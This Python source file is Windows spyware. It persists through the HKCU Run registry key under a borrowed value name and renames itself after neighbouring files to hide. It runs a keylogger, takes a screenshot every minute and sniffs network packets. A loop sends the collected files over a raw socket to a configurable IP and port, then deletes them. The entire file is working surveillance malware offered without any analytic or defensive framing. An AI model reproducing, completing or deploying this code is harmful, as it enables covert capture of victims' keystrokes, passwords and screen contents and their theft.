import os
import sys
import random
import time
import subprocess
import winreg
import socket
import pyautogui
from pynput import keyboard
from scapy.all import sniff
import threading

TARGET_IP = "127.0.0.1"
TARGET_PORT = 4444
SCREENSHOT_INTERVAL = 60
NETWORK_SNIFFER_TIMEOUT = 60
KEYLOG_INTERVAL = 10

def insertRunValue(sScriptPath, sValueName):
    sRegistryKey = winreg.HKEY_CURRENT_USER
    sRunPath = r"Software\Microsoft\Windows\CurrentVersion\Run"
    xPythonExecutable = sys.executable.replace('python.exe', 'pythonw.exe')
    sCommand = f'"{xPythonExecutable}" "{sScriptPath}" --startup"'
    with winreg.OpenKey(sRegistryKey, sRunPath, 0, winreg.KEY_ALL_ACCESS) as key:
        winreg.SetValueEx(key, sValueName, 0, winreg.REG_SZ, sCommand)

def getRunValues(sExcludedValueName=None):
    sRegistryKey = winreg.HKEY_CURRENT_USER
    sRunPath = r"Software\Microsoft\Windows\CurrentVersion\Run"
    sStartupValueNames = {}
    with winreg.OpenKey(sRegistryKey, sRunPath, 0, winreg.KEY_READ) as key:
        i = 0
        while True:
            try:
                sName, sValue, _ = winreg.EnumValue(key, i)
                if sName != sExcludedValueName:
                    sStartupValueNames[sName] = sValue
                i += 1
            except OSError:
                break
    return sStartupValueNames

def makeScriptName(sScriptPath, sExcludedFileName):
    sDirectory = os.path.dirname(sScriptPath)
    sExistingScriptNames = [f for f in os.listdir(sDirectory) if os.path.isfile(os.path.join(sDirectory, f)) and f != sExcludedFileName]
    if not sExistingScriptNames:
        sName, sExtension = os.path.splitext(sExcludedFileName)
        return f"{sName}.{sExtension}"
    sSelectedFileName = random.choice(sExistingScriptNames)
    sName, sExtension = os.path.splitext(sSelectedFileName)
    return f"{sName}.{sExtension}"

def renameScript(sScriptPath):
    sNewScriptName = makeScriptName(sScriptPath, os.path.basename(sScriptPath))
    sNewScriptPath = os.path.join(os.path.dirname(sScriptPath), sNewScriptName)
    os.rename(sScriptPath, sNewScriptPath)
    return sNewScriptPath

def updateRunValue(file_path, app_name):
    insertRunValue(file_path, app_name)

def makeValueName(sStartupValueNames):
    if sStartupValueNames:
        return f"{random.choice(list(sStartupValueNames.keys()))}..."
    else:
        return "default"

def getCurrentValueName(sScriptPath):
    sRegistryKey = winreg.HKEY_CURRENT_USER
    sRunPath = r"Software\Microsoft\Windows\CurrentVersion\Run"
    xPythonExecutable = sys.executable.replace('python.exe', 'pythonw.exe')
    sCommand = f'"{xPythonExecutable}" "{sScriptPath}" --startup"'
    with winreg.OpenKey(sRegistryKey, sRunPath, 0, winreg.KEY_READ) as key:
        i = 0
        while True:
            try:
                sName, sValue, _ = winreg.EnumValue(key, i)
                if sValue == sCommand:
                    return sName
                i += 1
            except OSError:
                break
    return None

def monitorRunKey(sScriptPath, sValueName):
    sRegistryKey = winreg.HKEY_CURRENT_USER
    sRunPath = r"Software\Microsoft\Windows\CurrentVersion\Run"
    xPythonExecutable = sys.executable.replace('python.exe', 'pythonw.exe')
    sCommand = f'"{xPythonExecutable}" "{sScriptPath}" --startup"'
    try:
        with winreg.OpenKey(sRegistryKey, sRunPath, 0, winreg.KEY_ALL_ACCESS) as key:
            try:
                sValue = winreg.QueryValueEx(key, sValueName)[0]
                if sValue != sCommand:
                    winreg.SetValueEx(key, sValueName, 0, winreg.REG_SZ, sCommand)
            except FileNotFoundError:
                winreg.SetValueEx(key, sValueName, 0, winreg.REG_SZ, sCommand)
    except:
        pass

def create_subdirectories(base_dir):
    keylog_dir = os.path.join(base_dir, "keylogs")
    screenshot_dir = os.path.join(base_dir, "screenshots")
    packets_dir = os.path.join(base_dir, "packets")
    os.makedirs(keylog_dir, exist_ok=True)
    os.makedirs(screenshot_dir, exist_ok=True)
    os.makedirs(packets_dir, exist_ok=True)
    return keylog_dir, screenshot_dir, packets_dir

def start_keylogger(log_directory):
    today = time.strftime("%Y-%m-%d")
    log_file = os.path.join(log_directory, f"{today}_keylog.txt")
    current_log = []
    def on_press(key):
        special = None
        try:
            ch = key.char
            if ch is None:
                special = " " + str(key) + " "
            else:
                current_log.append(ch)
        except AttributeError:
            txt = str(key).lower()
            if txt == "key.enter":
                special = " (enter) "
            elif txt == "key.backspace":
                special = " (<) "
            elif txt == "key.space":
                special = " "
            elif "shift" in txt:
                special = " (shift) "
            else:
                special = " " + str(key) + " "
        if special:
            current_log.append(special)
    def record_loop():
        while True:
            stamp = time.strftime("%Y-%m-%d %H:%M:%S")
            time.sleep(KEYLOG_INTERVAL)
            if current_log:
                with open(log_file, "a") as f:
                    f.write(f"[{stamp}] {''.join(current_log)}\n")
                current_log.clear()
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    record_thread = threading.Thread(target=record_loop, daemon=True)
    record_thread.start()
    listener.join()

def capture_screenshots(screenshot_directory, interval=SCREENSHOT_INTERVAL):
    while True:
        shot = pyautogui.screenshot()
        stamp = time.strftime("%Y%m%d_%H%M%S", time.localtime())
        shot.save(os.path.join(screenshot_directory, f"screenshot_{stamp}.png"))
        time.sleep(interval)

def start_sniffer(packets_directory):
    today = time.strftime("%Y-%m-%d")
    log_file = os.path.join(packets_directory, f"{today}_packets.txt")
    def packet_callback(packet):
        with open(log_file, "a") as f:
            f.write(time.strftime("%Y-%m-%d %H:%M:%S") + " - " + packet.summary() + "\n")
    sniff(prn=packet_callback, store=0, timeout=NETWORK_SNIFFER_TIMEOUT)

def transmit_files(ip, port, directory):
    while True:
        for file_name in os.listdir(directory):
            if file_name.endswith((".txt", ".png")):
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.connect((ip, port))
                        with open(os.path.join(directory, file_name), "rb") as f:
                            s.sendall(f.read())
                        os.remove(os.path.join(directory, file_name))
                except:
                    pass
        time.sleep(60)

def main():
    sScriptPath = os.path.abspath(__file__)
    sScriptDirectory = os.path.dirname(sScriptPath)
    keylog_dir, screenshot_dir, packets_dir = create_subdirectories(sScriptDirectory)
    if "--startup" in sys.argv:
        sValueName = getCurrentValueName(sScriptPath)
        sUpdatedScriptPath = renameScript(sScriptPath)
        updateRunValue(sUpdatedScriptPath, sValueName)
        threading.Thread(target=start_keylogger, args=(keylog_dir,), daemon=True).start()
        threading.Thread(target=capture_screenshots, args=(screenshot_dir, SCREENSHOT_INTERVAL), daemon=True).start()
        threading.Thread(target=start_sniffer, args=(packets_dir,), daemon=True).start()
        threading.Thread(target=transmit_files, args=(TARGET_IP, TARGET_PORT, sScriptDirectory), daemon=True).start()
        while True:
            monitorRunKey(sUpdatedScriptPath, sValueName)
            time.sleep(10)
    else:
        sStartupValueNames = getRunValues()
        sValueName = makeValueName(sStartupValueNames)
        if not sStartupValueNames:
            sValueName = "default"
        insertRunValue(sScriptPath, sValueName)

if __name__ == "__main__":
    main()
